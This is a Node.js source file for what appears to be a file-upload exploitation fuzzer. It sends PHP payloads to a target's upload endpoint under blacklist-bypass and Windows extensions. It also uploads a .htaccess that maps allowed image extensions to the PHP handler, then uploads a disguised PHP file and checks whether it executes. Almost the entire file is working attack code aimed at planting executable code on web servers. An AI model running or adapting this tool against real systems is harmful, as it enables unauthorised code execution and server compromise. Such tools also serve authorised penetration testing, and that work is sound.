import { analyzeUpload, extractUploadPath, verifyUploadPath, getBaseResponse } from './analyze.mjs';
import { request, extensions, red, green, yellow, blue, PHP_PAYLOAD, allowedExt, yellow_green, extContent } from './config.mjs';
import { exec } from 'child_process';
import { parseRequestFile } from './parser.mjs';

let verbose = process.argv.includes('-v');
export let brute = process.argv.includes('-b');

async function runFuzzer() {
    const file = process.argv[2];
    if (!file) {
        console.error("Usage: node fuzzer.mjs curl.txt (-v optional for verbose)");
        process.exit(1);
    }

    // parse request file
    Object.assign(request, await parseRequestFile(file));

    // get allowed ext response, used for comparing
    let baselineResponse = await getBaseResponse();
    if (baselineResponse === null) {
        console.log("[-] Verify host is up.");
        return;
    }

    console.log(blue("\n[+]    Trying to bypass blacklist...\n"));
    await testBypassExtensions(baselineResponse);


    // beggin fuzzing
    console.log(blue("\n[+]    Fuzzing extensions...\n"));
    await fuzzExtensions(baselineResponse)

    console.log(blue("\n[+]    Fuzzing config files...\n"));
    await fuzzConfigs(baselineResponse);

    let info = await hostInfo(request.url);
    if (info.isWindows) {
        console.log(blue("\n[+]    Windows Deteceted, Fuzzing Windows extensions...\n"));
        await fuzzWindows(baselineResponse);
    }
}

async function hostInfo(url) {
    return new Promise((resolve, reject) => {
        exec(`whatweb ${url}`, (error, stdout) => {
            if (error) return reject(error);

            const isWindows = /\b(Win32|Windows|Microsoft-IIS)\b/i.test(stdout);
            resolve({ isWindows });
        });
    });
}


async function fuzzExtensions(baselineResponse) {
    for (const ext of extensions.highPriority) {
        let filename = `test_${Math.random().toString(36).slice(2)}${ext}`;
        let uploadedResponse = await uploadFile(filename, PHP_PAYLOAD);

        let analysis = analyzeUpload(baselineResponse, uploadedResponse, filename);

        if (analysis.triggeredSignals[0] === 'REJECTED') {
            if (verbose) console.log(red(`[-]    ${filename}: BLOCKED - "${uploadedResponse}"`));
        } else if (analysis.isSuccessful) {
            const path = await extractUploadPath(uploadedResponse, filename);

            console.log(yellow_green(`[+]    ${filename}: UPLOADED (${analysis.confidence}/10)`));
            if (verbose) {
                console.log(`   Signals: ${analysis.triggeredSignals}`);
                console.log(`   Uploaded Path: ${path}`);
            }

            await verifyUploadPath(filename, request.url, path);
        } else {
            console.log(yellow(`[+]  ${filename}: Unclear (${analysis.confidence}/10)`));
        }
    }
}

async function fuzzWindows(baselineResponse) {
    for (const ext of extensions.windows) {

        let content = PHP_PAYLOAD;

        for (const k in extContent) {
            console.log({k: k})
            if (ext.includes(k)) {
                content = extContent[k] + content;
            }
        }

        let filename = `test_${Math.random().toString(36).slice(2)}${ext}`;
        let uploadedResponse = await uploadFile(filename, content);

        let analysis = analyzeUpload(baselineResponse, uploadedResponse, filename);

        if (analysis.isSuccessful) {
            console.log(yellow_green(`[+]    ${filename}: UPLOADED (${analysis.confidence}/10)`));
            const path = await extractUploadPath(uploadedResponse, filename);
            if (verbose) {
                console.log(`   Signals: ${analysis.triggeredSignals}`);
            }

            console.log(`   Uploaded Path: ${path}`);
            console.log(blue(`   Windows files require custom code...`));
        } else {
            console.log(red(`[-]    ${filename}: UPLOAD FAILED`));
        }
    }
}

async function fuzzConfigs(baselineResponse) {
    // .htaccess configuration to force .allowedExt files to execute as PHP
    const HTACCESS_PAYLOAD = "AddType application/x-httpd-php" + allowedExt;

    let filename = ".htaccess";
    let uploadedResponse = await uploadFile(filename, HTACCESS_PAYLOAD, 'text/plain');
    let analysis = analyzeUpload(baselineResponse, uploadedResponse, filename);

    if (analysis.isSuccessful) {
        console.log(yellow_green(`[+]    ${filename}: UPLOADED (${analysis.confidence}/10)`));
        if (verbose) console.log(`   Signals: ${analysis.triggeredSignals}`);
        await extractUploadPath(uploadedResponse, filename);
        // upload gif file

        let exploitFilename = `exploit_${Math.random().toString(36).slice(2)}` + allowedExt;
        let exploitUploadResponse = await uploadFile(exploitFilename, PHP_PAYLOAD, 'image/gif');

        let exploitAnalysis = analyzeUpload(baselineResponse, exploitUploadResponse, exploitFilename);
        if (exploitAnalysis.isSuccessful) {
            console.log(green(`    [+]    ${exploitFilename}: UPLOADED (${exploitAnalysis.confidence}/10)`));
            const exploitPath = await extractUploadPath(exploitUploadResponse, exploitFilename);
            if (verbose) console.log(`       Uploaded Path: ${exploitPath}`);

            await verifyUploadPath(filename, request.url, exploitPath, PHP_PAYLOAD);
        } else {
            console.log(red(`[-]    ${exploitFilename}: UPLOAD FAILED`));
        }
    } else {
        console.log(red(`[-]    ${filename}: UPLOAD FAILED`));
    }
}

async function testBypassExtensions(baselineResponse) {
    for (const ext of extensions.bypassAttempts) {
        let content = PHP_PAYLOAD;

        for (const k in extContent) {
            if (ext.includes(k)) {
                content = extContent[k] + content;
            }
        }

        const filename = `test_${Math.random().toString(36).slice(2)}${ext}`;
        const uploadedResponse = await uploadFile(filename, content);

        let analysis = analyzeUpload(baselineResponse, uploadedResponse, filename);

        if (analysis.isSuccessful) {
            console.log(yellow_green(`[+]    ${filename}: UPLOADED (${analysis.confidence}/10)`));
            const path = await extractUploadPath(uploadedResponse, filename);
            if (verbose) {
                console.log(`   Signals: ${analysis.triggeredSignals}`);
                console.log(`   Uploaded Path: ${path}`);
            }

            await verifyUploadPath(filename, request.url, path);
        } else {
            console.log(red(`[-]    ${filename}: UPLOAD FAILED`));
        }
    }
}

async function testExiftoolsPayloads(baselineResponse) {

    let image = "./images/shell.png"
    return new Promise((resolve, reject) => {
        exec(`exiftool ${image}`, (error, stdout) => {
            if (error) return reject(error);
        });
    });
}

async function uploadFile(filename, content, type = request.contentType) {
    const formData = new FormData();
    formData.append(request.formDataName, new Blob([content], { type }), filename);

    try {
        const res = await fetch(request.url, { method: request.method, body: formData });
        const body = await res.text();

        return body
    } catch (e) {
        console.log(`[-] Error uploading ${filename}`);
    }
}

runFuzzer();
